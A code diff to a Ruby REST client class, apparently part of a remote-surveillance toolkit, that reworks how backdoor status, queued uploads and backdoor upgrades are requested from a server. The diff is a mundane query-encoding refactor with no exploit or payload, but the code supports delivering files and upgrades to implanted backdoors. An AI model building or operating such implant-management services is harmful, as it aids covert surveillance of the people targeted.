@@ -4,6 +4,7 @@
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/cgi'
 
 # system
 require 'net/http'
@@ -212,9 +213,9 @@ class DB_rest
   # backdoor identify
   def backdoor_status(build_id, instance_id, subtype)
     begin
-      request = {:build_id => build_id, :instance_id => instance_id, :subtype => subtype}
-      ret = rest_call('GET', '/backdoor/status/' + request.to_json)
-
+      request = {:build => build_id, :instance => instance_id, :subtype => subtype}
+      ret = rest_call('GET', '/backdoor/status/?' + CGI.encode_query(request))
+      
       return DB::NO_SUCH_BACKDOOR, 0 if ret.kind_of? Net::HTTPNotFound
 
       status = JSON.parse(ret.body)
@@ -268,12 +269,12 @@ class DB_rest
       upl = {}
       # parse the results and get the contents of the uploads
       JSON.parse(ret.body).each do |elem|
-        request = {:backdoor_id => bid, :upload_id => elem['_id']}
+        request = {:upload => elem['_id']}
         upl[elem['_id']] = {:filename => elem['filename'],
-                            :content => rest_call('GET', "/backdoor/upload/#{request.to_json}").body }
+                            :content => rest_call('GET', "/backdoor/upload/#{bid}?" + CGI.encode_query(request)).body }
         trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['_id']][:content].length} bytes"
       end
-
+      
       return upl 
     rescue Exception => e
       trace :error, "Error calling new_uploads: #{e.class} #{e.message}"
@@ -298,9 +299,9 @@ class DB_rest
       upgr = {}
       # parse the results and get the contents of the uploads
       JSON.parse(ret.body).each do |elem|
-        request = {:backdoor_id => bid, :upgrade_id => elem['upgrade_id']}
+        request = {:upgrade => elem['upgrade_id']}
         upgr[elem['upgrade_id']] = {:filename => elem['filename'],
-                                    :content => rest_call('GET', "/backdoor/upgrade/#{request.to_json}").body }
+                                    :content => rest_call('GET', "/backdoor/upgrade/#{bid}?" + CGI.encode_query(request)).body }
         trace :debug, "File retrieved: [#{elem['filename']}] #{upgr[elem['upgrade_id']][:content].length} bytes"
       end
 
